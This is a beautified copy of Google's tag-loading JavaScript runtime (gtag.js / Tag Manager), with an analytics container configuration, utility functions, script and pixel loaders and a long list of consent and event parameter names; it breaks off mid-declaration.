// Copyright 2012 Google Inc. All rights reserved.

(function () {
  var data = {
    "resource": {
      "version": "1",
      "macros": [{
        "function": "__e"
      }, {
        "function": "__c",
        "vtp_value": "undefined"
      }],
      "tags": [{
        "function": "__rep",
        "vtp_containerId": "UA-187670865-1",
        "vtp_remoteConfig": ["map"],
        "tag_id": 1
      }, {
        "function": "__zone",
        "vtp_childContainers": ["list", ["map", "publicId", "G-R3CR6J6DL2"]],
        "vtp_enableConfiguration": false,
        "tag_id": 3
      }],
      "predicates": [{
        "function": "_eq",
        "arg0": ["macro", 0],
        "arg1": "gtm.js"
      }],
      "rules": [[["if", 0], ["add", 0, 1]]]
    },
    "runtime": []
  };

  /*
  
   Copyright The Closure Library Authors.
   SPDX-License-Identifier: Apache-2.0
  */
  var ca,
    da = function (a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    },
    ea = function (a) {
      return a.raw = a;
    },
    fa = function (a, b) {
      a.raw = b;
      return a;
    },
    ha = function (a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: da(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    },
    ia = "function" == typeof Object.create ? Object.create : function (a) {
      var b = function () {};
      b.prototype = a;
      return new b();
    },
    ja;
  if ("function" == typeof Object.setPrototypeOf) ja = Object.setPrototypeOf;else {
    var ka;
    a: {
      var la = {
          a: !0
        },
        na = {};
      try {
        na.__proto__ = la;
        ka = na.a;
        break a;
      } catch (a) {}
      ka = !1;
    }
    ja = ka ? function (a, b) {
      a.__proto__ = b;
      if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
      return a;
    } : null;
  }
  var oa = ja,
    pa = function (a, b) {
      a.prototype = ia(b.prototype);
      a.prototype.constructor = a;
      if (oa) oa(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.Bm = b.prototype;
    },
    qa = this || self,
    ra = function (a) {
      return a;
    };
  var sa = function () {},
    ta = function (a) {
      return "function" === typeof a;
    },
    g = function (a) {
      return "string" === typeof a;
    },
    ua = function (a) {
      return "number" === typeof a && !isNaN(a);
    },
    va = Array.isArray,
    xa = function (a, b) {
      if (a && va(a)) for (var c = 0; c < a.length; c++) if (a[c] && b(a[c])) return a[c];
    },
    ya = function (a, b) {
      if (!ua(a) || !ua(b) || a > b) a = 0, b = 2147483647;
      return Math.floor(Math.random() * (b - a + 1) + a);
    },
    Ba = function (a, b) {
      for (var c = new Aa(), d = 0; d < a.length; d++) c.set(a[d], !0);
      for (var e = 0; e < b.length; e++) if (c.get(b[e])) return !0;
      return !1;
    },
    k = function (a, b) {
      for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(c, a[c]);
    },
    Ca = function (a) {
      return !!a && ("[object Arguments]" === Object.prototype.toString.call(a) || Object.prototype.hasOwnProperty.call(a, "callee"));
    },
    Da = function (a) {
      return Math.round(Number(a)) || 0;
    },
    Ea = function (a) {
      return "false" === String(a).toLowerCase() ? !1 : !!a;
    },
    Fa = function (a) {
      var b = [];
      if (va(a)) for (var c = 0; c < a.length; c++) b.push(String(a[c]));
      return b;
    },
    Ga = function (a) {
      return a ? a.replace(/^\s+|\s+$/g, "") : "";
    },
    Ia = function () {
      return new Date(Date.now());
    },
    Ja = function () {
      return Ia().getTime();
    },
    Aa = function () {
      this.prefix = "gtm.";
      this.values = {};
    };
  Aa.prototype.set = function (a, b) {
    this.values[this.prefix + a] = b;
  };
  Aa.prototype.get = function (a) {
    return this.values[this.prefix + a];
  };
  var Ka = function (a, b, c) {
      return a && a.hasOwnProperty(b) ? a[b] : c;
    },
    La = function (a) {
      var b = a;
      return function () {
        if (b) {
          var c = b;
          b = void 0;
          try {
            c();
          } catch (d) {}
        }
      };
    },
    Ma = function (a, b) {
      for (var c in b) b.hasOwnProperty(c) && (a[c] = b[c]);
    },
    Oa = function (a) {
      for (var b in a) if (a.hasOwnProperty(b)) return !0;
      return !1;
    },
    Pa = function (a, b) {
      for (var c = [], d = 0; d < a.length; d++) c.push(a[d]), c.push.apply(c, b[a[d]] || []);
      return c;
    },
    Qa = function (a, b) {
      for (var c = {}, d = c, e = a.split("."), f = 0; f < e.length - 1; f++) d = d[e[f]] = {};
      d[e[e.length - 1]] = b;
      return c;
    },
    Ra = /^\w{1,9}$/,
    Sa = function (a, b) {
      a = a || {};
      b = b || ",";
      var c = [];
      k(a, function (d, e) {
        Ra.test(d) && e && c.push(d);
      });
      return c.join(b);
    },
    Ta = function (a, b) {
      function c() {
        ++d === b && (e(), e = null, c.done = !0);
      }
      var d = 0,
        e = a;
      c.done = !1;
      return c;
    };
  function Ua() {
    for (var a = Va, b = {}, c = 0; c < a.length; ++c) b[a[c]] = c;
    return b;
  }
  function Wa() {
    var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    a += a.toLowerCase() + "0123456789-_";
    return a + ".";
  }
  var Va, Xa;
  function Ya(a) {
    Va = Va || Wa();
    Xa = Xa || Ua();
    for (var b = [], c = 0; c < a.length; c += 3) {
      var d = c + 1 < a.length,
        e = c + 2 < a.length,
        f = a.charCodeAt(c),
        h = d ? a.charCodeAt(c + 1) : 0,
        l = e ? a.charCodeAt(c + 2) : 0,
        m = f >> 2,
        n = (f & 3) << 4 | h >> 4,
        p = (h & 15) << 2 | l >> 6,
        q = l & 63;
      e || (q = 64, d || (p = 64));
      b.push(Va[m], Va[n], Va[p], Va[q]);
    }
    return b.join("");
  }
  function Za(a) {
    function b(m) {
      for (; d < a.length;) {
        var n = a.charAt(d++),
          p = Xa[n];
        if (null != p) return p;
        if (!/^[\s\xa0]*$/.test(n)) throw Error("Unknown base64 encoding at char: " + n);
      }
      return m;
    }
    Va = Va || Wa();
    Xa = Xa || Ua();
    for (var c = "", d = 0;;) {
      var e = b(-1),
        f = b(0),
        h = b(64),
        l = b(64);
      if (64 === l && -1 === e) return c;
      c += String.fromCharCode(e << 2 | f >> 4);
      64 != h && (c += String.fromCharCode(f << 4 & 240 | h >> 2), 64 != l && (c += String.fromCharCode(h << 6 & 192 | l)));
    }
  }
  ;
  var $a = {},
    ab = function (a, b) {
      $a[a] = $a[a] || [];
      $a[a][b] = !0;
    },
    bb = function () {
      delete $a.GA4_EVENT;
    },
    cb = function (a) {
      var b = $a[a];
      if (!b || 0 === b.length) return "";
      for (var c = [], d = 0, e = 0; e < b.length; e++) 0 === e % 8 && 0 < e && (c.push(String.fromCharCode(d)), d = 0), b[e] && (d |= 1 << e % 8);
      0 < d && c.push(String.fromCharCode(d));
      return Ya(c.join("")).replace(/\.+$/, "");
    };
  var db = Array.prototype.indexOf ? function (a, b) {
    return Array.prototype.indexOf.call(a, b, void 0);
  } : function (a, b) {
    if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
    for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
    return -1;
  };
  var eb,
    fb = function () {
      if (void 0 === eb) {
        var a = null,
          b = qa.trustedTypes;
        if (b && b.createPolicy) {
          try {
            a = b.createPolicy("goog#html", {
              createHTML: ra,
              createScript: ra,
              createScriptURL: ra
            });
          } catch (c) {
            qa.console && qa.console.error(c.message);
          }
          eb = a;
        } else eb = a;
      }
      return eb;
    };
  var gb = function (a) {
    this.h = a;
  };
  gb.prototype.toString = function () {
    return this.h + "";
  };
  var hb = {};
  var ib = /^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i;
  var jb, kb;
  a: {
    for (var lb = ["CLOSURE_FLAGS"], mb = qa, nb = 0; nb < lb.length; nb++) if (mb = mb[lb[nb]], null == mb) {
      kb = null;
      break a;
    }
    kb = mb;
  }
  var ob = kb && kb[610401301];
  jb = null != ob ? ob : !1;
  function pb() {
    var a = qa.navigator;
    if (a) {
      var b = a.userAgent;
      if (b) return b;
    }
    return "";
  }
  var qb,
    rb = qa.navigator;
  qb = rb ? rb.userAgentData || null : null;
  function sb(a) {
    return jb ? qb ? qb.brands.some(function (b) {
      var c = b.brand;
      return c && -1 != c.indexOf(a);
    }) : !1 : !1;
  }
  function tb(a) {
    return -1 != pb().indexOf(a);
  }
  ;
  function ub() {
    return jb ? !!qb && 0 < qb.brands.length : !1;
  }
  function vb() {
    return ub() ? !1 : tb("Opera");
  }
  function wb() {
    return tb("Firefox") || tb("FxiOS");
  }
  function xb() {
    return ub() ? sb("Chromium") : (tb("Chrome") || tb("CriOS")) && !(ub() ? 0 : tb("Edge")) || tb("Silk");
  }
  ;
  var yb = {},
    zb = function (a) {
      this.h = a;
    };
  zb.prototype.toString = function () {
    return this.h.toString();
  };
  var Ab = function (a) {
    return a instanceof zb && a.constructor === zb ? a.h : "type_error:SafeHtml";
  }; /*
     SPDX-License-Identifier: Apache-2.0
     */
  function Bb(a) {
    var b = a.tagName;
    if ("SCRIPT" === b || "STYLE" === b) throw Error("");
  }
  ;
  var Cb = ea([""]),
    Db = fa(["\x00"], ["\\0"]),
    Eb = fa(["\n"], ["\\n"]),
    Fb = fa(["\x00"], ["\\u0000"]);
  function Gb(a) {
    return Object.isFrozen(a) && Object.isFrozen(a.raw);
  }
  -1 !== function () {
    return Gb(Cb) && Gb(Db) && Gb(Eb) && Gb(Fb);
  }.toString().indexOf("[") || function () {
    return "";
  }.toString().indexOf("`");
  function Hb(a) {
    var b = a = Ib(a),
      c = fb(),
      d = c ? c.createHTML(b) : b;
    return new zb(d, yb);
  }
  function Ib(a) {
    return null === a ? "null" : void 0 === a ? "undefined" : a;
  }
  ;
  var z = window,
    D = document,
    Jb = navigator,
    Kb = D.currentScript && D.currentScript.src,
    Lb = function (a, b) {
      var c = z[a];
      z[a] = void 0 === c ? b : c;
      return z[a];
    },
    Mb = function (a, b) {
      b && (a.addEventListener ? a.onload = b : a.onreadystatechange = function () {
        a.readyState in {
          loaded: 1,
          complete: 1
        } && (a.onreadystatechange = null, b());
      });
    },
    Nb = {
      async: 1,
      nonce: 1,
      onerror: 1,
      onload: 1,
      src: 1,
      type: 1
    },
    Ob = {
      onload: 1,
      src: 1,
      width: 1,
      height: 1,
      style: 1
    };
  function Pb(a, b, c) {
    b && k(b, function (d, e) {
      d = d.toLowerCase();
      c.hasOwnProperty(d) || a.setAttribute(d, e);
    });
  }
  var Qb = function (a, b, c, d, e) {
      var f = D.createElement("script");
      Pb(f, d, Nb);
      f.type = "text/javascript";
      f.async = !0;
      var h,
        l = Ib(a),
        m = fb(),
        n = m ? m.createScriptURL(l) : l;
      h = new gb(n, hb);
      f.src = h instanceof gb && h.constructor === gb ? h.h : "type_error:TrustedResourceUrl";
      var p,
        q,
        r,
        t = null == (r = (q = (f.ownerDocument && f.ownerDocument.defaultView || window).document).querySelector) ? void 0 : r.call(q, "script[nonce]");
      (p = t ? t.nonce || t.getAttribute("nonce") || "" : "") && f.setAttribute("nonce", p);
      Mb(f, b);
      c && (f.onerror = c);
      if (e) e.appendChild(f);else {
        var u = D.getElementsByTagName("script")[0] || D.body || D.head;
        u.parentNode.insertBefore(f, u);
      }
      return f;
    },
    Rb = function () {
      if (Kb) {
        var a = Kb.toLowerCase();
        if (0 === a.indexOf("https://")) return 2;
        if (0 === a.indexOf("http://")) return 3;
      }
      return 1;
    },
    Sb = function (a, b, c, d, e) {
      var f;
      f = void 0 === f ? !0 : f;
      var h = e,
        l = !1;
      h || (h = D.createElement("iframe"), l = !0);
      Pb(h, c, Ob);
      d && k(d, function (n, p) {
        h.dataset[n] = p;
      });
      f && (h.height = "0", h.width = "0", h.style.display = "none", h.style.visibility = "hidden");
      if (l) {
        var m = D.body && D.body.lastChild || D.body || D.head;
        m.parentNode.insertBefore(h, m);
      }
      Mb(h, b);
      void 0 !== a && (h.src = a);
      return h;
    },
    Tb = function (a, b, c, d) {
      var e = new Image(1, 1);
      Pb(e, d, {});
      e.onload = function () {
        e.onload = null;
        b && b();
      };
      e.onerror = function () {
        e.onerror = null;
        c && c();
      };
      e.src = a;
    },
    Ub = function (a, b, c, d) {
      a.addEventListener ? a.addEventListener(b, c, !!d) : a.attachEvent && a.attachEvent("on" + b, c);
    },
    Vb = function (a, b, c) {
      a.removeEventListener ? a.removeEventListener(b, c, !1) : a.detachEvent && a.detachEvent("on" + b, c);
    },
    G = function (a) {
      z.setTimeout(a, 0);
    },
    Wb = function (a, b) {
      return a && b && a.attributes && a.attributes[b] ? a.attributes[b].value : null;
    },
    Xb = function (a) {
      var b = a.innerText || a.textContent || "";
      b && " " != b && (b = b.replace(/^[\s\xa0]+|[\s\xa0]+$/g, ""));
      b && (b = b.replace(/(\xa0+|\s{2,}|\n|\r\t)/g, " "));
      return b;
    },
    Yb = function (a) {
      var b = D.createElement("div"),
        c = b,
        d = Hb("A<div>" + a + "</div>");
      1 === c.nodeType && Bb(c);
      c.innerHTML = Ab(d);
      b = b.lastChild;
      for (var e = []; b.firstChild;) e.push(b.removeChild(b.firstChild));
      return e;
    },
    Zb = function (a, b, c) {
      c = c || 100;
      for (var d = {}, e = 0; e < b.length; e++) d[b[e]] = !0;
      for (var f = a, h = 0; f && h <= c; h++) {
        if (d[String(f.tagName).toLowerCase()]) return f;
        f = f.parentElement;
      }
      return null;
    },
    $b = function (a) {
      var b;
      try {
        b = Jb.sendBeacon && Jb.sendBeacon(a);
      } catch (c) {
        ab("TAGGING", 15);
      }
      b || Tb(a);
    },
    ac = function (a, b) {
      var c = a[b];
      c && "string" === typeof c.animVal && (c = c.animVal);
      return c;
    },
    bc = function (a) {
      var b = {
        headers: {
          "Attribution-Reporting-Eligible": "trigger"
        },
        keepalive: !0,
        attributionReporting: {
          eventSourceEligible: !0,
          triggerEligible: !0
        }
      };
      try {
        z.fetch(a, b);
      } catch (c) {}
    },
    cc = function () {
      var a = z.performance;
      if (a && ta(a.now)) return a.now();
    },
    dc = function () {
      return z.performance || void 0;
    }; /*
       jQuery (c) 2005, 2012 jQuery Foundation, Inc. jquery.org/license. */
  var ec = /\[object (Boolean|Number|String|Function|Array|Date|RegExp)\]/,
    fc = function (a) {
      if (null == a) return String(a);
      var b = ec.exec(Object.prototype.toString.call(Object(a)));
      return b ? b[1].toLowerCase() : "object";
    },
    gc = function (a, b) {
      return Object.prototype.hasOwnProperty.call(Object(a), b);
    },
    ic = function (a) {
      if (!a || "object" != fc(a) || a.nodeType || a == a.window) return !1;
      try {
        if (a.constructor && !gc(a, "constructor") && !gc(a.constructor.prototype, "isPrototypeOf")) return !1;
      } catch (c) {
        return !1;
      }
      for (var b in a);
      return void 0 === b || gc(a, b);
    },
    H = function (a, b) {
      var c = b || ("array" == fc(a) ? [] : {}),
        d;
      for (d in a) if (gc(a, d)) {
        var e = a[d];
        "array" == fc(e) ? ("array" != fc(c[d]) && (c[d] = []), c[d] = H(e, c[d])) : ic(e) ? (ic(c[d]) || (c[d] = {}), c[d] = H(e, c[d])) : c[d] = e;
      }
      return c;
    };
  var jc = function (a) {
    if (void 0 == a || va(a) || ic(a)) return !0;
    switch (typeof a) {
      case "boolean":
      case "number":
      case "string":
      case "function":
        return !0;
    }
    return !1;
  };
  function kc(a) {
    switch (a) {
      case 1:
        return "1";
      case 2:
      case 4:
        return "0";
      default:
        return "-";
    }
  }
  function lc(a) {
    switch (a) {
      case 1:
        return "G";
      case 3:
        return "g";
      case 2:
        return "D";
      case 4:
        return "d";
      case 0:
        return "g";
      default:
        return "g";
    }
  }
  function mc(a, b) {
    var c = a[1] || 0,
      d = a[2] || 0;
    switch (b) {
      case 0:
        return "G1" + kc(c) + kc(d);
      case 1:
        return "G2" + lc(c) + lc(d);
      default:
        return "g1--";
    }
  }
  ;
  var nc = function () {
    var a = function (b) {
      return {
        toString: function () {
          return b;
        }
      };
    };
    return {
      Ii: a("consent"),
      xg: a("convert_case_to"),
      yg: a("convert_false_to"),
      zg: a("convert_null_to"),
      Ag: a("convert_true_to"),
      Bg: a("convert_undefined_to"),
      Yl: a("debug_mode_metadata"),
      ia: a("function"),
      Ef: a("instance_name"),
      Oj: a("live_only"),
      Pj: a("malware_disabled"),
      Qj: a("metadata"),
      Tj: a("original_activity_id"),
      im: a("original_vendor_template_id"),
      hm: a("once_on_load"),
      Sj: a("once_per_event"),
      Eh: a("once_per_load"),
      mm: a("priority_override"),
      om: a("respected_consent_types"),
      Ih: a("setup_tags"),
      od: a("tag_id"),
      Nh: a("teardown_tags")
    };
  }();
  var Lc = [],
    Mc = function (a) {
      return void 0 == Lc[a] ? !1 : Lc[a];
    };
  var Nc;
  var Oc = [],
    Pc = [],
    Qc = [],
    Rc = [],
    Sc = [],
    Tc = {},
    Uc,
    Vc,
    Xc = function () {
      var a = Wc;
      Vc = Vc || a;
    },
    Yc = function (a) {},
    Zc,
    $c = [],
    ad = function (a, b) {
      var c = a[nc.ia],
        d = b && b.event;
      if (!c) throw Error("Error: No function name given for function call.");
      var e = Tc[c],
        f = b && 2 === b.type && d.mg && e && -1 !== $c.indexOf(c),
        h = {},
        l = {},
        m;
      for (m in a) a.hasOwnProperty(m) && 0 === m.indexOf("vtp_") && (e && d && d.Sh && d.Sh(a[m]), e && (h[m] = a[m]), !e || f) && (l[m.substr(4)] = a[m]);
      e && d && d.Rh && (h.vtp_gtmCachedValues = d.Rh);
      if (b) {
        if (null == b.name) {
          var n;
          a: {
            var p = b.index;
            if (null == p) n = "";else {
              var q;
              switch (b.type) {
                case 2:
                  q = Oc[p];
                  break;
                case 1:
                  q = Rc[p];
                  break;
                default:
                  n = "";
                  break a;
              }
              var r = q && q[nc.Ef];
              n = r ? String(r) : "";
            }
          }
          b.name = n;
        }
        e && (h.vtp_gtmEntityIndex = b.index, h.vtp_gtmEntityName = b.name);
      }
      var t, u;
      e && (t = e(h));
      if (!e || f) u = Nc(c, l, b);
      f && d && (jc(t) ? typeof t !== typeof u && d.mg(d.id, c) : t !== u && d.mg(d.id, c));
      return e ? t : u;
    },
    cd = function (a, b, c) {
      c = c || [];
      var d = {},
        e;
      for (e in a) a.hasOwnProperty(e) && (d[e] = bd(a[e], b, c));
      return d;
    },
    bd = function (a, b, c) {
      if (va(a)) {
        var d;
        switch (a[0]) {
          case "function_id":
            return a[1];
          case "list":
            d = [];
            for (var e = 1; e < a.length; e++) d.push(bd(a[e], b, c));
            return d;
          case "macro":
            var f = a[1];
            if (c[f]) return;
            var h = Oc[f];
            if (!h || b.Wf(h)) return;
            c[f] = !0;
            var l = String(h[nc.Ef]);
            try {
              var m = cd(h, b, c);
              m.vtp_gtmEventId = b.id;
              b.priorityId && (m.vtp_gtmPriorityId = b.priorityId);
              d = ad(m, {
                event: b,
                index: f,
                type: 2,
                name: l
              });
              Zc && (d = Zc.kk(d, m));
            } catch (y) {
              b.fi && b.fi(y, Number(f), l), d = !1;
            }
            c[f] = !1;
            return d;
          case "map":
            d = {};
            for (var n = 1; n < a.length; n += 2) d[bd(a[n], b, c)] = bd(a[n + 1], b, c);
            return d;
          case "template":
            d = [];
            for (var p = !1, q = 1; q < a.length; q++) {
              var r = bd(a[q], b, c);
              Vc && (p = p || r === Vc.se);
              d.push(r);
            }
            return Vc && p ? Vc.nk(d) : d.join("");
          case "escape":
            d = bd(a[1], b, c);
            if (Vc && va(a[1]) && "macro" === a[1][0] && Vc.Vk(a)) return Vc.yl(d);
            d = String(d);
            for (var t = 2; t < a.length; t++) oc[a[t]] && (d = oc[a[t]](d));
            return d;
          case "tag":
            var u = a[1];
            if (!Rc[u]) throw Error("Unable to resolve tag reference " + u + ".");
            return d = {
              Xh: a[2],
              index: u
            };
          case "zb":
            var v = {
              arg0: a[2],
              arg1: a[3],
              ignore_case: a[5]
            };
            v[nc.ia] = a[1];
            var w = dd(v, b, c),
              x = !!a[4];
            return x || 2 !== w ? x !== (1 === w) : null;
          default:
            throw Error("Attempting to expand unknown Value type: " + a[0] + ".");
        }
      }
      return a;
    },
    dd = function (a, b, c) {
      try {
        return Uc(cd(a, b, c));
      } catch (d) {
        JSON.stringify(a);
      }
      return 2;
    },
    fd = function (a) {
      var b = a[nc.ia];
      if (!b) throw Error("Error: No function name given for function call.");
      return !!Tc[b];
    };
  var id = function (a) {
      function b(r) {
        for (var t = 0; t < r.length; t++) d[r[t]] = !0;
      }
      for (var c = [], d = [], e = gd(a), f = 0; f < Pc.length; f++) {
        var h = Pc[f],
          l = hd(h, e);
        if (l) {
          for (var m = h.add || [], n = 0; n < m.length; n++) c[m[n]] = !0;
          b(h.block || []);
        } else null === l && b(h.block || []);
      }
      for (var p = [], q = 0; q < Rc.length; q++) c[q] && !d[q] && (p[q] = !0);
      return p;
    },
    hd = function (a, b) {
      for (var c = a["if"] || [], d = 0; d < c.length; d++) {
        var e = b(c[d]);
        if (0 === e) return !1;
        if (2 === e) return null;
      }
      for (var f = a.unless || [], h = 0; h < f.length; h++) {
        var l = b(f[h]);
        if (2 === l) return null;
        if (1 === l) return !1;
      }
      return !0;
    },
    gd = function (a) {
      var b = [];
      return function (c) {
        void 0 === b[c] && (b[c] = dd(Qc[c], a));
        return b[c];
      };
    };
  var jd = {
    kk: function (a, b) {
      b[nc.xg] && "string" === typeof a && (a = 1 == b[nc.xg] ? a.toLowerCase() : a.toUpperCase());
      b.hasOwnProperty(nc.zg) && null === a && (a = b[nc.zg]);
      b.hasOwnProperty(nc.Bg) && void 0 === a && (a = b[nc.Bg]);
      b.hasOwnProperty(nc.Ag) && !0 === a && (a = b[nc.Ag]);
      b.hasOwnProperty(nc.yg) && !1 === a && (a = b[nc.yg]);
      return a;
    }
  };
  var xd = ["matches", "webkitMatchesSelector", "mozMatchesSelector", "msMatchesSelector", "oMatchesSelector"],
    yd = new Aa();
  var Fd = /^[1-9a-zA-Z_-][1-9a-c][1-9a-v]\d$/;
  function Gd(a, b) {
    return "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[a << 2 | b];
  }
  ;
  var Id = function (a) {
      return Hd ? D.querySelectorAll(a) : null;
    },
    Jd = function (a, b) {
      if (!Hd) return null;
      if (Element.prototype.closest) try {
        return a.closest(b);
      } catch (e) {
        return null;
      }
      var c = Element.prototype.matches || Element.prototype.webkitMatchesSelector || Element.prototype.mozMatchesSelector || Element.prototype.msMatchesSelector || Element.prototype.oMatchesSelector,
        d = a;
      if (!D.documentElement.contains(d)) return null;
      do {
        try {
          if (c.call(d, b)) return d;
        } catch (e) {
          break;
        }
        d = d.parentElement || d.parentNode;
      } while (null !== d && 1 === d.nodeType);
      return null;
    },
    Kd = !1;
  if (D.querySelectorAll) try {
    var Ld = D.querySelectorAll(":root");
    Ld && 1 == Ld.length && Ld[0] == D.documentElement && (Kd = !0);
  } catch (a) {}
  var Hd = Kd;
  var J = function (a) {
    ab("GTM", a);
  };
  var K = {
      g: {
        fb: "ad_personalization",
        F: "ad_storage",
        K: "ad_user_data",
        N: "analytics_storage",
        Vb: "region",
        Od: "consent_updated",
        Ye: "wait_for_update",
        Mi: "ads",
        Xl: "all",
        Ni: "android",
        Oi: "chrome",
        Pi: "playstore",
        Qi: "search",
        Ri: "shopping",
        Si: "youtube",
        Ti: "app_remove",
        Ui: "app_store_refund",
        Vi: "app_store_subscription_cancel",
        Wi: "app_store_subscription_convert",
        Xi: "app_store_subscription_renew",
        Cg: "add_payment_info",
        Dg: "add_shipping_info",
        Wb: "add_to_cart",
        Xb: "remove_from_cart",
        Eg: "view_cart",
        Eb: "begin_checkout",
        Yb: "select_item",
        Ta: "view_item_list",
        hb: "select_promotion",
        Ua: "view_promotion",
        ka: "purchase",
        Zb: "refund",
        xa: "view_item",
        Fg: "add_to_wishlist",
        Yi: "exception",
        Zi: "first_open",
        aj: "first_visit",
        la: "gtag.config",
        Ha: "gtag.get",
        bj: "in_app_purchase",
        ac: "page_view",
        cj: "screen_view",
        dj: "session_start",
        ej: "timing_complete",
        fj: "track_social",
        Qd: "user_engagement",
        ib: "gclid",
        ma: "ads_data_redaction",
        Z: "allow_ad_personalization_signals",
        df: "allow_custom_scripts",
        ef: "allow_display_features",
        Rd: "allow_enhanced_conversions",
        jb: "allow_google_signals",
        Ba: "allow_interest_groups",
        gj: "app_id",
        ij: "app_installer_id",
        jj: "app_name",
        kj: "app_version",
        bc: "auid",
        lj: "auto_detection_enabled",
        Fb: "aw_remarketing",
        ff: "aw_remarketing_only",
        Sd: "discount",
        Td: "aw_feed_country",
        Ud: "aw_feed_language",
        T: "items",
        Vd: "aw_merchant_id",
        Gg: "aw_basket_type",
        Ac: "campaign_content",
        Bc: "campaign_id",
        Cc: "campaign_medium",
        Dc: "campaign_name",
        Ec: "campaign",
        Fc: "campaign_source",
        Gc: "campaign_term",
        Va: "client_id",
        mj: "content_group",
        nj: "content_type",
        Ia: "conversion_cookie_prefix",
        Hc: "conversion_id",
        ya: "conversion_linker",
        Gb: "conversion_api",
        Oa: "cookie_domain",
        Ca: "cookie_expires",
        Pa: "cookie_flags",
        fc: "cookie_name",
        Ic: "cookie_path",
        Ja: "cookie_prefix",
        kb: "cookie_update",
        hc: "country",
        na: "currency",
        Wd: "customer_lifetime_value",
        Jc: "custom_map",
        Hg: "gcldc",
        oj: "debug_mode",
        W: "developer_id",
        pj: "disable_merchant_reported_purchases",
        Kc: "dc_custom_params",
        qj: "dc_natural_search",
        Ig: "dynamic_event_settings",
        Jg: "affiliation",
        Xd: "checkout_option",
        hf: "checkout_step",
        Kg: "coupon",
        Lc: "item_list_name",
        jf: "list_name",
        rj: "promotions",
        Mc: "shipping",
        kf: "tax",
        Yd: "engagement_time_msec",
        Nc: "enhanced_client_id",
        Zd: "enhanced_conversions",
        Lg: "enhanced_conversions_automatic_settings",
        ae: "estimated_delivery_date",
        lf: "euid_logged_in_state",
        Oc: "event_callback",
        sj: "event_category",
        lb: "event_developer_id_string",
        tj: "event_label",
        Mg: "event",
        be: "event_settings",
        ce: "event_timeout",
        uj: "description",
        vj: "fatal",
        wj: "experiments",
        nf: "firebase_id",
        de: "first_party_collection",
        ee: "_x_20",
        Hb: "_x_19",
        Ng: "fledge",
        Og: "flight_error_code",
        Pg: "flight_error_message",
        Qg: "fl_activity_category",
        Rg: "fl_activity_group",
        pf: "fl_advertiser_id",
        Sg: "fl_ar_dedupe",
        Tg: "fl_random_number",
        Ug: "tran",
        Vg: "u",
        fe: "gac_gclid",
        ic: "gac_wbraid",
        Wg: "gac_wbraid_multiple_conversions",
        Xg: "ga_restrict_domain",
        qf: "ga_temp_client_id",
        he: "gdpr_applies",
        Yg: "geo_granularity",
        nb: "value_callback",
        Xa: "value_key",
        am: "google_ono",
        Ya: "google_signals",
        Zg: "google_tld",
        ie: "groups",
        ah: "gsa_experiment_id",
        bh: "iframe_state",
        je: "ignore_referrer",
        rf: "internal_traffic_results",
        pb: "is_legacy_converted",
        qb: "is_legacy_loaded",
        ke: "is_passthrough",
        eh: "_lps",
        Da: "language",
        tf: "legacy_developer_id_string",
        za: "linker",
        jc: "accept_incoming",
        rb: "decorate_forms",
        O: "domains",
        Ib: "url_position",
        fh: "method",
        xj: "name",
        Pc: "new_customer",
        gh: "non_interaction",
        yj: "optimize_id",
        zj: "page_hostname",
        Qc: "page_path",
        Aa: "page_referrer",
        sb: "page_title",
        hh: "passengers",
        ih: "phone_conversion_callback",
        Aj: "phone_conversion_country_code",
        jh: "phone_conversion_css_class",
        Bj: "phone_conversion_ids",
        kh: "phone_conversion_number",
        lh: "phone_conversion_options",
        Rc: "quantity",
        Sc: "redact_device_info",
        uf: "redact_enhanced_user_id",
        Cj: "redact_ga_client_id",
        Dj: "redact_user_id",
        me: "referral_exclusion_definition",
        Jb: "restricted_data_processing",
        Ej: "retoken",
        Fj: "sample_rate",
        vf: "screen_name",
        tb: "screen_resolution",
        Gj: "search_term",
        Ka: "send_page_view",
        Kb: "send_to",
        Tc: "server_container_url",
        Uc: "session_duration",
        ne: "session_engaged",
        wf: "session_engaged_time",
        ub: "session_id",
        oe: "session_number",
        Vc: "delivery_postal_code",
        mh: "temporary_client_id",
        xf: "topmost_url",
        Hj: "tracking_id",
        yf: "traffic_type",
        qa: "transaction_id",
        Lb: "transport_url",
        nh: "trip_type",
        Mb: "update",
        vb: "url_passthrough",
        Wc: "_user_agent_architecture",
        Xc: "_user_agent_bitness",
        Yc: "_user_agent_full_version_list",
        Zc: "_user_agent_mobile",
        ad: "_user_agent_model",
        bd: "_user_agent_platform",
        dd: "_user_agent_platform_version",
        ed: "_user_agent_wow64",
        ra: "user_data",
        oh: "user_data_auto_latency",
        ph: "user_data_auto_meta",
        qh: "user_data_auto_multi",
        rh: "user_data_auto_selectors",
        sh: "user_data_auto_status",
        zf: "user_data_mode",
        qe: "user_data_settings",
        wa: "user_id",
        La: "user_properties",
        th: "_user_region",
        uh: "us_privacy_string",
        aa: "value",
        kc: "wbraid",
        vh: "wbraid_multiple_conversions",
        Bh: "_host_name",
        Ch: "_in_page_command",
        Dh: "_is_passthrough_cid",
        jd: "non_personalized_ads",
        nd: "_sst_parameters",
        Wa: "conversion_label",
        oa: "page_location",
        ob: "global_developer_id_string",
        pe: "tc_privacy_string"
      }
    },
    ie = {},
